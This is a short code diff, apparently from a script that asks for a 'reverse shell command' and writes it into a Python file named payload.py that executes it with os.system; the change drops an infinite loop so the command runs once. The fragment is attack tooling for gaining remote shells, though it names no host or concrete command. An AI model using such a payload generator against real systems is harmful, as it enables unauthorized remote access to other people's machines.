@@ -11,9 +11,7 @@ payload = input("\nEnter reverse shell command: ")
 text = f'''\
 #!/bin/python3.10
 import os
-
-while True:
-    os.system('{payload}')
+os.system('{payload}')
 '''
 
 with open ("payload.py", "w") as thePayload:
